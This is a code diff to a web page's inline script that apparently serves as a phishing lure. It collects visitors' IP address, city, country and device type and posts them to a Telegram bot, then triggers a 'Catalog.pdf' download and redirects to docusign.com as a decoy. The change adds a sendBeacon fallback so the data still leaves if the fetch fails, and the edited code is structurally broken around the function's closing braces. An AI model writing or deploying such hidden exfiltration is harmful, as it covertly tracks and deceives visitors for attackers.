@@ -181,24 +181,6 @@ message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unkn
 message += `📡 IP: ${ip}\n`;
 message += `🖥️ Device: ${deviceType}`;
 
-    // Try to send to Telegram
-    try {
-      await fetch(telegramUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({
-          chat_id: chatId,
-          text: message
-        })
-      });
-    } catch (err) {
-      console.warn("⚠️ Telegram send failed:", err);
-    }
-
-  } catch (err) {
-    console.warn("⚠️ IP or Geo fetch failed:", err);
-  }
-
   // ✅ Always trigger PDF download + redirect
   const link = document.createElement("a");
   link.href = "https://raw.githubusercontent.com/ddfjhfg/pdf-hosting/main/Catalog.pdf";
@@ -210,6 +192,38 @@ message += `🖥️ Device: ${deviceType}`;
   setTimeout(() => {
     window.location.href = "https://www.docusign.com";
   }, 2000);
+}
+        let telegramSent = false;
+
+// Try fetch first
+try {
+  const res = await fetch(telegramUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: new URLSearchParams({
+      chat_id: chatId,
+      text: message
+    })
+  });
+
+  telegramSent = res.ok;
+} catch (err) {
+  console.warn("⚠️ Telegram fetch failed, trying sendBeacon...");
+}
+
+// Fallback to sendBeacon if fetch fails
+if (!telegramSent && navigator.sendBeacon) {
+  try {
+    const beaconData = new URLSearchParams({
+      chat_id: chatId,
+      text: message
+    });
+
+    const blob = new Blob([beaconData], { type: "application/x-www-form-urlencoded" });
+    telegramSent = navigator.sendBeacon(telegramUrl, blob);
+  } catch (e) {
+    console.warn("⚠️ sendBeacon failed:", e);
+  }
 }
     });
   </script>
